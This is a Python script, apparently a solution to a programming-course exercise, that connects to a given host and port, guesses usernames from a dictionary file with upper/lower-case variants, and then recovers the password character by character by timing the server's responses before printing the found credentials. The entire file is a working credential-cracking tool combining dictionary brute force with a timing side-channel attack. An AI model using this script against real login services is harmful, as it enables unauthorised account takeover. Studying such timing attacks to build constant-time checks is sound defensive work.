# write your code here
import itertools
import json
import os
import socket
import string
import sys
import time


LOGIN_DICT_FILENAME = "logins.txt"
RESPONSE_BUF_SIZE = 1024
POSSIBLE_PWD_CHARS = string.ascii_letters + string.digits
WRONG_PWD_RESP = "Wrong password!"
CONNECTION_SUCCESS_RESP = "Connection success!"


def find_login(client_skt):
    with open(get_login_file_path()) as login_dictionary_file:
        for possible_login in login_dictionary_file.readlines():
            login_mutation_gen = str_mutation_gen(possible_login.strip())
            for login_mutation in login_mutation_gen:
                if check_login(login_mutation, client_skt):
                    return login_mutation


def find_password(client_skt, user_login):
    pwd = ""
    while True:
        response_time_per_char = dict()
        for possible_next_char in POSSIBLE_PWD_CHARS:
            pwd_to_try = pwd + possible_next_char
            start_time = time.perf_counter()
            response = send_msg(client_skt, login=user_login, password=pwd_to_try)
            if response == CONNECTION_SUCCESS_RESP:
                return pwd_to_try
            end_time = time.perf_counter()
            total_time = end_time - start_time
            response_time_per_char[possible_next_char] = total_time
        pwd_next_char = max(response_time_per_char, key=response_time_per_char.get)
        pwd = pwd + pwd_next_char


def get_login_file_path():
    return os.path.join(sys.path[0], LOGIN_DICT_FILENAME)


def str_mutation_gen(text):
    text = text.strip()
    return ("".join(x) for x in itertools.product(*zip(text.lower(), text.upper())))


def check_login(login_to_check, client_skt):
    response = send_msg(client_skt, login=login_to_check, password="")
    return response == WRONG_PWD_RESP


def send_msg(client_skt, **kwargs):
    msg = json.dumps(kwargs)
    client_skt.send(msg.encode())
    json_response = client_skt.recv(RESPONSE_BUF_SIZE).decode()
    return json.loads(json_response).get("result")


if len(sys.argv) < 3:
    print("Wrong number of arguments")
    sys.exit(0)

hostname = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client_socket:
    client_socket.connect((hostname, port))
    login = find_login(client_socket)
    password = find_password(client_socket, login)
    result = json.dumps({"login": login, "password": password})
    print(result)
